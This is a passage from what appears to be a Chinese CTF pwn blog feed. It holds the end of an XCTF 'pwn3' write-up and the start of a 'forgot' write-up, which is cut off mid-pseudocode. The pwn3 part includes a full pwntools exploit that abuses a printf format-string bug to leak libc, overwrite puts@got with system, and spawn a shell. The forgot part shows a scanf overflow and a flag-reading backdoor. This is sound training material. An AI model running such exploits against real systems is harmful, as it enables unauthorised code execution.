keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        result <span class="token operator">=</span> v5 <span class="token operator">+</span> a1<span class="token punctuation">;</span>        <span class="token operator">*</span>v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      result <span class="token operator">=</span> <span class="token operator">++</span>v5<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">>=</span> a2 <span class="token punctuation">)</span>     #控制输入量不会大于a2        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>所以get_input大致作用是：标准输入中读入字符串，写入堆区v0。第一个get_input最多40个字节（字符），第二个从堆区(v0 + 10)开始因为v0是大小为4字节的指针，所以加10将</strong><br><strong>刚好从40个字节后开始填入字符串，最多读入200个：</strong><br><img src="https://s1.ax1x.com/2020/07/17/U6yP8x.png" alt=""></p><p><strong>show_dir函数：</strong></p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">show_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-414h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+414h] [ebp-14h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+418h] [ebp-10h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+41Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">bzero</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">1024u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">// 将s数组置零</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> file_head<span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">240</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    #首先i被赋值file_head即堆区地址，发现中间i并没有判断，后面的i再次进行赋值  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    #中间也没有明显的进行判断    <span class="token punctuation">{</span>      v0 <span class="token operator">=</span> v5<span class="token operator">++</span><span class="token punctuation">;</span>      s<span class="token punctuation">[</span>v0<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>    #对s数组逐个赋值，从堆区地址开始    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>第一个for循环：i先被赋予堆区地址，中间的表达式（即i）不为0，执行一次内部语句后，i又被堆区240个字节开始赋值，靠后的应该这个区域值为0，所以第一个for应该只会执行一次<br>第二个for循环：中间是直接对(i + j)地址解引用，即(i + j)地址上的字节，显然解引用到值为0的地址才会停。<br>最后是调用puts函数其参数就是经过赋值后的s。<br><img src="https://s1.ax1x.com/2020/07/17/U6yCP1.png" alt=""><br>那么如果我file_name很短，那就只会将fiel_name赋给s数组，然后输出s（什么名字40个字符这么长？？）。那么基本就可以确定puts的参数就是s即file_name</p></blockquote><p><strong>get_file函数：</strong></p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">get_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> dest<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-FCh]</span>  <span class="token keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+E4h] [ebp-34h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10Ch] [ebp-Ch]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter the file name you want to get:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%40s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>   #显然这里不会存在溢出  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"too young, too simple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>file_head<span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token number">60</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>   #第一个是i被赋予堆区地址，第二个i显然不会为<span class="token number">0</span>，第三个将i转换为<span class="token number">4</span>字节指针后加<span class="token number">60</span>那其实                                                                        又是堆区<span class="token number">240</span>字节后的区域，将使i<span class="token operator">=</span> <span class="token number">0</span> ，所以这个<span class="token keyword">for</span>也只执行一次  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">)</span> <span class="token punctuation">)</span>                      <span class="token comment" spellcheck="true">// 堆区开头是file_name 所以输入对应的file_name到s1即可进入if</span>    <span class="token punctuation">{</span>      <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// i+40地址处的是我们的content </span>      <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>所以整个函数是你输入对应的file_name就输出对应的tontent（结合程序本身，伪码有些不一定准确），显然这个printf是存在格式化字符串漏洞的，但是它的参数是i+40即tontent的内容。</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p><strong>首先可以用这个漏洞泄露函数真实地址，从而得到libc版本。又ASLR没开，能漏洞改写函数got表上的地址，改成system地址。因为我们不能控制程序流程，只能靠跳转实现system（无法在栈上构造数据）。system函数只有一个参数，纵观程序中所有函数只有puts函数如此相像，我们想办法把puts的got表上的地址改为system地址，然后它的参数s内容搞成/bin/sh字符串即可。</strong></p><blockquote><p>确定格式化字符串参数偏移<br>利用 __libc_start_main_got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。<br>参数s就是我们的file_name<br>修改 puts@got 的内容为 system 的地址。<br>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</p></blockquote><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><p>注意printf漏洞是在get_file函数中实现的，所以一定要记得调用get选项</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span> context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn3'</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>main_start_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>main_start_got<span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn3'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'rxraclhm'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#密码绕过</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'put'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#调用put函数</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>name <span class="token operator">=</span> <span class="token string">'/sh'</span>      <span class="token comment" spellcheck="true">#名字/sh</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token string">'%8$s'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_start_got<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#准备__libc_start_main地址的泄露</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用get函数利用漏洞</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/sh'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print u32(sh.recv(4))</span>main_start_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#得到地址</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>main_start_addr<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#得到libc版本</span>libc_addr <span class="token operator">=</span> main_start_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span>   sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'put'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用put函数</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#名字/bin</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token punctuation">{</span>puts_got<span class="token punctuation">:</span>system_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#准备将system地址写入puts_got</span><span class="token keyword">print</span> payload<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#调用get函数利用漏洞</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin'</span><span class="token punctuation">)</span>  <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#调用dir函数，此时s是/bin/sh 可通过调试得出</span><span class="token comment" spellcheck="true">#sh.recv()            最后将跳转puts函数参数为/bin/sh但执行system函数，得到shell</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-c"><code class="language-c">    000000d0  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">00</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  │    │·   │    │    │    <span class="token number">000000e0</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  │    │    │    │    │    000000f0  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">00</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">28</span> a0  <span class="token number">04</span> <span class="token number">08</span> <span class="token number">29</span> a0  │    │  ·a│<span class="token function">aa</span><span class="token punctuation">(</span>·│··<span class="token punctuation">)</span>·│    <span class="token number">00000100</span>  <span class="token number">04</span> <span class="token number">08</span> 2a a0  <span class="token number">04</span> <span class="token number">08</span> 2b a0  <span class="token number">04</span> <span class="token number">08</span> <span class="token number">66</span> <span class="token number">74</span>  <span class="token number">70</span> 3e        │··<span class="token operator">*</span>·│··<span class="token operator">+</span>·│··ft│p<span class="token operator">></span>│    0000010e               \x98            \x04                                                                                                                                                                                      \x00                                \<span class="token function">x00aa</span><span class="token punctuation">(</span>\xa0\x04<span class="token punctuation">)</span>\xa0\x04<span class="token operator">*</span>\xa0\x04<span class="token operator">+</span>\xa0\x04ftp<span class="token operator">></span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x4</span> bytes<span class="token punctuation">:</span>    <span class="token string">'dir\n'</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-challege-forgot</title>
      <link href="/2020/07/16/xctf-challege-forgot/"/>
      <url>/2020/07/16/xctf-challege-forgot/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec forgot<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/forgot'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>只开了NX</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c">main函数关键代码size_t v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">char</span> v2<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-74h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fun1<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-54h]  #显然这是一串指针数组，指向函数</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fun2<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-50h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fun3<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-4Ch]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v6<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-48h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v7<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+40h] [ebp-44h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v8<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+44h] [ebp-40h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v9<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+48h] [ebp-3Ch]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v10<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4Ch] [ebp-38h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v11<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+50h] [ebp-34h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v12<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+54h] [ebp-30h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+58h] [ebp-2Ch]</span>  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+78h] [ebp-Ch]</span>  size_t i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+7Ch] [ebp-8h]</span>  v14 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  fun1 <span class="token operator">=</span> sub_8048604<span class="token punctuation">;</span>  #将函数地址赋值给指针  fun2 <span class="token operator">=</span> sub_8048618<span class="token punctuation">;</span>  fun3 <span class="token operator">=</span> sub_804862C<span class="token punctuation">;</span>  v6 <span class="token operator">=</span> sub_8048640<span class="token punctuation">;</span>  v7 <span class="token operator">=</span> sub_8048654<span class="token punctuation">;</span>  v8 <span class="token operator">=</span> sub_8048668<span class="token punctuation">;</span>  v9 <span class="token operator">=</span> sub_804867C<span class="token punctuation">;</span>  v10 <span class="token operator">=</span> sub_8048690<span class="token punctuation">;</span>  v11 <span class="token operator">=</span> sub_80486A4<span class="token punctuation">;</span>  v12 <span class="token operator">=</span> sub_80486B8<span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter the string to be validate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>   #溢出点函数，没有限制输入的大小   <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v0 <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">>=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v14 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048702</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>   #里面的函数是来对单个字符进行判别的，比较复杂，但是能搞懂逻辑顺序。          v14 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'@'</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_804874C</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>         #里面的函数是来对单个字符进行判别          v14 <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.'</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>         #里面的函数是来对单个字符进行判别          v14 <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                v14 <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">7</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">8</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">9</span><span class="token punctuation">:</span>        v14 <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>fun1 <span class="token operator">+</span> <span class="token operator">--</span>v14<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   #跳转到指针数组指向特定函数  main函数之外：  后门，这个函数名和前面的混在一起我一开始都没找到  <span class="token keyword">int</span> <span class="token function">sub_80486CC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Eh] [ebp-3Ah]</span>  <span class="token function">snprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x32u</span><span class="token punctuation">,</span> <span class="token string">"cat %s"</span><span class="token punctuation">,</span> <span class="token string">"./flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 